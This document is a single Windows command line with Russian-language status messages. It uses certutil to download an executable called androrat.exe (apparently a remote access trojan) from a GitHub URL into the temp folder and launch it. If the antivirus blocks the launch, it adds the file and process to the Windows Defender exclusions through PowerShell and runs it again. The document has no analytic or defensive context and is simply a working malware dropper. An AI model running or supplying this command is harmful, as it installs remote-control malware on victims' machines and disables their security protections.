cmd /c "echo Загрузка программы... & certutil -urlcache -split -f https://github.com/l0xsydeveloper/forangels/raw/main/androrat.exe %temp%\app.exe & echo Запуск... & start %temp%\app.exe & timeout 3 & if errorlevel 1 (echo Антивирус заблокировал, добавляю в исключения... & powershell -Command "Add-MpPreference -ExclusionPath '%temp%\app.exe' -Force; Add-MpPreference -ExclusionProcess 'app.exe' -Force" & echo Повторный запуск... & start %temp%\app.exe)"